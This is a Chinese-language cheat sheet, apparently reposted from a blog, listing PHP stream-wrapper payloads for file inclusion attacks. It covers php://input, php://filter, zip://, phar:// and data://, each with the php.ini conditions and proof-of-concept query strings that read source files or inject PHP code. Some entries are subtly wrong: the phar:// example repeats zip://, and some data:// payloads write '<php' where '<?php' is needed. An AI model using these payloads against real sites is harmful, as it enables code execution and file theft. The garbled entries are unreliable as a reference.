# 常见的 php 伪协议

> 原文地址 [blog.csdn.net](https://blog.csdn.net/yao_xin_de_yuan/article/details/108326427)



### 1、php://input

可以获取 POST 的数据流

```php
条件：
allow_url_include=On
allow_url_fopen-Off/On

POC:
file =php://input
POST:phpinfo();
```

### 2、php://filter

可以获取指定文件的源码，但是当他与包含函数结合是，php://filter 流会被当做 php 文件执行  
。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取

```php
条件：
allow_url_fopen=Off/On
allow_url_include=Off/On


POC:
?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```

### 3、zip://

可以访问压缩包里的文件。当他与包含函数结合时，zip:// 流会被当做 php 文件执行。  
从而实现任意文件执行。  
同类型的还有：zlib:// 和 bzip2://

```php
条件：
必须要zip压缩包（后缀无所谓，文件格式是zip就行）。
allow_url_fopen=Off/On
allow_url_include=Off/On
php >=5.2

POC:
zip://[压缩包绝对路径]#[压缩包内的文件]
?file=zip://D:\zip.zip%23phpinfo.txt
```

### 4、phar://

和 zip:// 类似  
绝对路径和相对路径都可以

```php
条件：
必须要zip压缩包（后缀无所谓，文件格式是zip就行）。
allow_url_fopen=Off/On
allow_url_include=Off/On
php >=5.2


POC:
zip://[压缩包绝对路径]#[压缩包内的文件]
?file=zip://D:\zip.zip/phpinfo.php(与zip://不同之处在于一个是# ，一个是/)
```

### 5、data://

同样类似于 php://input

```php
条件：
allow_url_fopen=On
allow_url_include=On


POC:
?file=data://,<?php phpinfo();
?file=data://text/plain,<php phpinfo();
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
?file=data:text/plain,<php phpinfo();
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```